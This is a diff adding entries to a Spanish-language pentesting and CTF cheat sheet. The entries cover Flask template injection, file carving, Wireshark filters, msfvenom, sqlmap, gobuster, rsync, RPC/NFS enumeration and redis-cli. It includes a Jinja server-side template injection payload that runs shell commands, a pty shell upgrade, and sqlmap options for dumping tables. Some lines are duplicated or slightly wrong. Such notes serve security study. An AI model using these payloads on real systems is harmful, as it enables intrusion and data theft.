@@ -51,6 +51,41 @@
 
 	python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+7. Template Injection | Flask:
+
+	• {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+
+	• "poppen('command')": command		→ se puede usar para los comandos de la shell
+
+8. File decompression
+
+   -- BINARIES --
+
+	• python3 -c 'data=open("file.ext", "rb"); open("hiddenFile.ext", "wb").write(data[hex:])'
+
+		- hex: after examine the file with "binwalk" it'll show the hexadecimal where is located the
+		hidden file
+
+ 		- To read and write binaries is necessary to indicate the flags: 
+
+			"rb" → Read Binary
+			"wb" → Write Binary
+			"ab" → Append Binary
+
+	Also we can use "argv" to not "hardcode" the file:
+
+	• python3 -c 'import sys; data=open(sys.argv[1], "rb"); open("hiddenFile.ext", "wb").write(data[hex:])'
+
+  	--- 
+
+  	-- ZLIB --
+
+  	• python3 -c 'import zlib,sys; sys.stdout.buffer.write(zlib.decompress(open(sys.argv[1], "rb").read()))'
+
+  		- After the script is necessary to pass the file as an argument and then the file to receive the data
+
+			python3 -c '...script...' file.zlib > outfile.bin
+
 ----------------------------------------------------------------------------------
 
 	"Netcat" - "nc"
@@ -119,6 +154,36 @@
 	"capabilities" - "getcap"
 
 1. Investigar
+
+----------------------------------------------------------------------------------
+
+	"wireshark"
+
+1. Filtrar por IPs:
+
+	ip.src == x.x.x.x	→ Filtra por IP visitante
+
+	ip.addr == x.x.x.x	→ Todo el tráfico de/hacia esa IP
+
+	http			→ protocolo HTTP
+
+	ftp			→ protocolo FTP
+
+	*Se pueden usar todos los procolos*
+
+	||			→ operador lógico OR
+
+	&&			→ operador lógico AN
+
+	http			→ protocolo HTTP
+
+	ftp			→ protocolo FTP
+
+	*Se pueden usar todos los procolos*
+
+	||			→ operador lógico OR
+
+	&&			→ operador lógico AND
 
 ----------------------------------------------------------------------------------
 
@@ -380,11 +445,72 @@
 
 	• Background: CTRL+Z o background
 
+7. Recargar el paquete:
+
+	reload_all
+
+8. Reiniciar las configuraciones de exploit:
+
+	unset all
+
+----------------------------------------------------------------------------------
+
+	"msfvenom"
+
+1. Es una herramienta del framework Metasploit que combina dos utilidades antiguas (msfpayload + msfencode) en una sola. Su función principal es generar payloads (cargas maliciosas) para pruebas de penetración.
+
+2. Comando útiles:
+
+	msfvenom -l [payloads, encoders, nops, all]
+
+	msfvenom -p [payload]	→ encontrado con el flag anterior
+
+	msfvenom -p [payload] --list-options	→ Lista las opciones de flags para ese payload en específico
+
+NOTA:
+
+msfconsole                          msfvenom
+     │                                  │
+     │  contiene los exploits           │  genera el payload
+     │  (eternalblue, etc.)             │  (shell.elf, shell.exe...)
+     │                                  │
+     └──────────── trabajan juntos ─────┘
+
 ----------------------------------------------------------------------------------
 
 	"sqlmap"
 
-1. Investigar: man sqlmap
+1. Bruteforce SQL requests:
+
+	sqlmap [options]
+
+	-u			→ URL
+
+	-p			→ prueba parámetros
+
+	--data=DATA		→ "username=test&password=test"
+
+	--risk=RISK		→ Aumenta el riesgo de los payloads
+
+	--level=LEVEL		→ Aumenta la profundidad de los test
+
+	--tables		→ Enumera tablas
+
+	--batch			→ No pregunta por inputs de usuario, usa comportamiento predeterminado
+
+	--dbs			→ Enumera databases
+
+	--forms			→ detecta y parsea formularios automáticamente
+
+	-r			→ request file, cargar archivo http desde un archivo (headers)
+
+	-D			→ DBMS (sistema gestor de bases de datos) para enumerar
+
+	--tables		→ Enumerar tablas de DBMS
+
+	-T			→ tablas de DBMS para enumerar
+
+	--dump			→ Vuelva las entradas de la tablas del DBMS (se debe usar con -T)
 
 ----------------------------------------------------------------------------------
 
@@ -405,6 +531,16 @@
 	-t: threads
 
 	-x: busca por extensiones (para el flag dir)
+
+	-s: status code
+
+	-b: blacklist
+
+	--xl: exclude length
+
+2. Fuzzing de parámetros: 
+
+	gobuster fuzz -u "URL" -w /ruta/wordlist.txt
 
 ----------------------------------------------------------------------------------
 
@@ -692,7 +828,132 @@
 
 	• smbclient //server/path -p <PORT> -N
 
+4. Se usan comandos parecidos para interactuar:
+
+	ls
+
+	cd
+
+	get
+
+	help
+
 ----------------------------------------------------------------------------------
+
+	"rsync"
+
+1. rsync es una aplicación libre para sistemas de tipo Unix y Microsoft Windows que ofrece transmisión eficiente de datos incrementales, que opera también con datos comprimidos y cifrados. Mediante una técnica de delta encoding, permite sincronizar archivos y directorios entre dos máquinas de una red o entre dos ubicaciones en una misma máquina, minimizando el volumen de datos transferidos.
+
+2. Comandos útiles:
+
+	rsync --list-only rsync://ip	→ lista directorios/archivos
+
+	rsync rsync://ip/path		→ ingresar al path que indique '--list-only'
+
+	rsync rsync://user@ip/path	→ ingresar con usuario
+
+3. Ingresar un archivo por rsync
+
+	rsync /path/to/file rsync://ip/path
+
+-----------------------------------------------------------------------------------
+
+	"RPC" - "rpcbind"
+1. rpcbind es utilizado por los servicios RPC (Remote Procedure Call, llamada a procedimientos remotos). Un servicio RPC es un servicio basado en un servidor que gestiona llamadas a procedimientos remotos. rpcbind se utiliza para determinar qué servicios pueden responder a las solicitudes entrantes para prestar el servicio especificado.
+
+Es un protocolo que permite a un programa ejecutar funciones en una máquina remota como si fueran locales. No es un servicio en sí mismo, sino una infraestructura de comunicación.
+
+2. Primero hay que verificar que el servicio esté corriendo:
+
+	nc -z -v -u <target-ip> 111
+
+4. Nmap es muy útil en este caso para saber si hay NFS montado:
+
+	nmap --script nfs* <IP>
+
+
+	- "rpcinfo" -
+
+Se puede obtener información con:
+	
+	rpcinfo -p <IP>
+
+
+	- "rpcclient" -
+
+
+
+---------------------------------------------------------------------------------
+
+	"enum4linux"
+
+1. Una sencilla interfaz que envuelve las herramientas del paquete Samba para ofrecer una funcionalidad similar a la de enum.exe (anteriormente disponible en www.bindview.com). También se han añadido algunas funcionalidades adicionales, como el ciclo de RID, para mayor comodidad.
+
+2. Comandos útiles:
+
+	enum4linux -a <IP>	→ Todas las enumeraciones simples
+
+---------------------------------------------------------------------------------
+
+	"showmount"
+
+1. Investigar mejor
+
+2. Comandos útiles:
+
+	showmount [FLAG] <IP>
+
+	FLAG:
+
+	-a	→ all
+
+	-d	→ directories
+
+	-e	→ exports
+
+	-h	→ help
+
+	-v	→ version
+
+	--no-headers
+
+---------------------------------------------------------------------------------
+
+	"NFS" - ("mount" para NFS)
+
+NFS (Network File System) es un protocolo que permite a un servidor compartir directorios a través de la red, y a un cliente montarlos como si fueran una carpeta local suya.
+
+1. En este caso se verá mount para el protocolo NFS:
+
+	- NFS se apoya en RPC para funcionar.
+
+	- Puerto por defecto: 111
+
+2. Comandos útiles:
+
+	sudo mount -t -t nfs <IP>:/found/path /dir/to/mont	→ el PATH debe ser encontrado con 'showmount' (explicado más arriba)
+
+---------------------------------------------------------------------------------
+
+	"Redis" - "redis-cli"
+
+Redis es una base de datos en memoria (key-value store) muy usada para caché, sesiones, colas de tareas, etc. Es extremadamente rápida porque todo vive en RAM.
+En contexto de seguridad es interesante porque históricamente ha tenido configuraciones inseguras — por ejemplo, sin contraseña y accesible desde cualquier IP, lo que permitía escritura arbitraria de archivos en el servidor.
+
+1. Comandos útiles:
+
+	redis-cli [FLAGS]
+
+	-h <HOST>
+
+	-p <PORT>
+
+	-a <PASSWORD>
+
+2. Una vez dentro:
+
+	https://redis.io/docs/latest/commands/redis-8-6-commands/
+---------------------------------------------------------------------------------
 
 	"Windows":
 
